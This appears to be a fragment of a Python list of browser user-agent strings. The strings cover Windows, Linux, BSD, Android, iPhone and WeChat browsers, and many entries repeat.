	 "Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
     'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
     'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
     'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
     'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
     'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5', 'Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20', 'Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a', 'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2', 'Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre',
     'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2', 'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0', 'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
     'Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0',
     'Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1',
     'Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15',
     'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
     'Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
     'Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025',
     'Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1',
     'Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020',
     'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1',
     'Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)',
     'Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330',
     'Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8',
     'Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0',
     'Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0',
     'Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15',
     'Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3',
     'Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0', 'Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN', 'Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
     'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
     'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
     'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
     'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5', 'Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20', 'Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a', 'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2', 'Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre',
     'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2', 'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0', 'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
     'Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0',
     'Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1',
     'Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15',
     'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
     'Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
     'Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025',
     'Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1',
